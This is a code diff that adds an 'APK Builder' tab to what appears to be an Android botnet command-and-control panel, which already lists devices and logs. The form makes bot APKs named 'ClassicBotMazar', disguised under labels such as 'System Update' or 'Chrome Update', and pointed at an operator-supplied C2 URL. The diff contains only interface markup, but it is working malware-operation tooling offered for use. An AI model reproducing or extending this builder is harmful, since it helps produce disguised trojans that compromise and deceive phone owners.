@@ -26,6 +26,7 @@ require_once __DIR__ . '/../database.php';
         <div class="tabs">
             <button class="tab-button active" onclick="switchTab('devices')">Devices</button>
             <button class="tab-button" onclick="switchTab('logs')">Logs</button>
+            <button class="tab-button" onclick="switchTab('builder')">Builder</button>
         </div>
 
         <div id="devices-tab" class="tab-content active">
@@ -89,6 +90,39 @@ require_once __DIR__ . '/../database.php';
             </div>
             <div class="pagination" id="logsPagination"></div>
         </div>
+
+        <div id="builder-tab" class="tab-content">
+            <div class="toolbar">
+                <h2>APK Builder</h2>
+            </div>
+            <div class="form-container" style="max-width: 500px; margin: 20px 0; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1);">
+                <div class="form-group" style="margin-bottom: 15px;">
+                    <label for="apkName" style="display: block; margin-bottom: 5px; font-weight: bold;">APK Filename:</label>
+                    <input type="text" id="apkName" value="ClassicBotMazar" placeholder="e.g. MyBot" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
+                </div>
+                <div class="form-group" style="margin-bottom: 15px;">
+                    <label for="appLabel" style="display: block; margin-bottom: 5px; font-weight: bold;">App Name (Label):</label>
+                    <input type="text" id="appLabel" value="System Update" placeholder="e.g. Chrome Update" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
+                </div>
+                <div class="form-group" style="margin-bottom: 15px;">
+                    <label for="c2Url" style="display: block; margin-bottom: 5px; font-weight: bold;">C2 URL:</label>
+                    <input type="text" id="c2Url" placeholder="http://your-domain.com/c2/" style="width: 100%; padding: 8px; border: 1px solid #ddd; border-radius: 4px;">
+                </div>
+                <button onclick="buildApk()" id="buildBtn" class="btn-primary" style="width: 100%;">Build APK</button>
+                
+                <div id="buildStatus" style="margin-top: 20px; display: none;">
+                    <p id="statusMessage" style="font-weight: bold;"></p>
+                    <div id="downloadLink" style="display: none; margin-top: 10px;">
+                        <a id="apkDownloadBtn" href="#" class="btn-secondary" style="display: inline-block; text-decoration: none; text-align: center;">Download APK</a>
+                    </div>
+                    <details style="margin-top: 15px;">
+                        <summary style="cursor: pointer; color: #666;">View Build Log</summary>
+                        <pre id="buildLog" style="background: #f4f4f4; padding: 10px; border-radius: 4px; font-size: 12px; overflow-x: auto; max-height: 300px;"></pre>
+                    </details>
+                </div>
+            </div>
+        </div>
+    </div>
     </div>
 
     <div id="commandModal" class="modal">
